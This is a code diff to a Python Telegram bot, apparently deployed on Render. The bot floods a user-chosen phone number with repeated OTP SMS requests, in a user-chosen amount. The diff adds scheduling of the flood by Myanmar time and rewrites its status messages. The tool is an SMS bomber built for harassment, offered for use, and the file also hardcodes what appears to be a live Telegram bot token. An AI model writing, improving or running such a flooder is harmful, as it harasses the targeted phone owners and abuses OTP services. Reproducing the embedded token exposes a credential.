@@ -5,20 +5,18 @@ import json
 import urllib.request
 import urllib.parse
 import threading
-from datetime import datetime
+from datetime import datetime, timedelta
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
-# ကိုကြီးပေးထားတဲ့ Token အသစ်
 TOKEN = "8905904062:AAGICQMVC0UXrATqaWOpq0NEFrGL_1JcDR0"
 BASE_URL = f"https://api.telegram.org/bot{TOKEN}"
-# Render ကပေးတဲ့ ကိုယ့် URL အသစ်ကို ဒီမှာ ထည့်ပေးပါ
 YOUR_URL = "https://mrfrog-sms-bot-v2.onrender.com" 
 
 USER_STATES = {}
 PHONE, AMOUNT, TIME_STATE = 1, 2, 3
 
 # ==========================================
-# RENDER 24/7 ပိုင်း (Port Server & Ping)
+# RENDER 24/7 ပိုင်း
 # ==========================================
 class RenderServer(BaseHTTPRequestHandler):
     def do_GET(self):
@@ -77,23 +75,23 @@ def flood_sms(phone, amount, chat_id):
             with urllib.request.urlopen(req, timeout=10) as response:
                 if response.status == 200:
                     success_count += 1
-                    send_message(chat_id, f"[{i+1}] တစ်ခုရောက်သွားပြီဆိုပေမဲ့ သူမကမင်းဆီပြန်ရောက်မလာခဲ့ဘူး ✅")
-                else:
-                    send_message(chat_id, f"[{i+1}] မင်းနဲ့သူမလိုပဲလွဲခဲ့ပြီ❌")
+                    send_message(chat_id, f"[{i+1}] OTP တစ်ခု ပို့ပြီးပါပြီ ✅")
         except:
-            send_message(chat_id, f"[{i+1}] မင်းနဲ့သူမလိုပဲ လွဲခဲ့ပြီ ❌")
+            send_message(chat_id, f"[{i+1}] ပို့ဆောင်မှု လွဲချော်နေပါတယ် ❌")
         time.sleep(1)
     return success_count
 
 def scheduled_task(phone, amount, target_time, chat_id):
     send_message(chat_id, f"[⏳] အချိန် {target_time} ကို စောင့်နေပါပြီ...")
     while True:
-        if datetime.now().strftime("%H:%M") == target_time:
+        # မြန်မာအချိန်ကို စစ်ဆေးခြင်း
+        current_mm_time = (datetime.utcnow() + timedelta(hours=6, minutes=30)).strftime("%H:%M")
+        if current_mm_time == target_time:
             break
         time.sleep(30)
-    send_message(chat_id, "[🚀] အချိန်ကျပြီ! OTP တွေ ပို့လွှတ်နေပါပြီ...")
+    send_message(chat_id, "[🚀] အချိန်ကျပြီ! OTP တွေ စတင်ပို့လွှတ်နေပါပြီ...")
     success = flood_sms(phone, amount, chat_id)
-    send_message(chat_id, f"[✔] ပြီးပြီ! အောင်မြင်မှု: {success}/{amount}\nနောက်ထပ် /start နှိပ်ပါ။")
+    send_message(chat_id, f"[✔] ပြီးပြီ! အောင်မြင်မှု: {success}/{amount}\nနောက်ထပ် /start ပြန်နှိပ်ပါ။")
 
 def handle_update(update):
     if "message" not in update or "text" not in update["message"]: return
@@ -115,7 +113,9 @@ def handle_update(update):
     elif state["state"] == AMOUNT:
         state["amount"] = int(text)
         state["state"] = TIME_STATE
-        send_message(chat_id, "ပို့ရမယ့်အချိန်ထည့်ပါ (ဥပမာ 12:00):")
+        # ယခုအချိန်ကို ပြပေးခြင်း
+        current_mm_time = (datetime.utcnow() + timedelta(hours=6, minutes=30)).strftime("%H:%M")
+        send_message(chat_id, f"[⏰] ယခုအချိန်: {current_mm_time}\nပို့ရမယ့်အချိန်ထည့်ပါ (ဥပမာ 23:00):")
     elif state["state"] == TIME_STATE:
         target_time = text
         phone, amount = state["phone"], state["amount"]
@@ -143,3 +143,4 @@ def main():
 
 if __name__ == '__main__':
     main()
+    
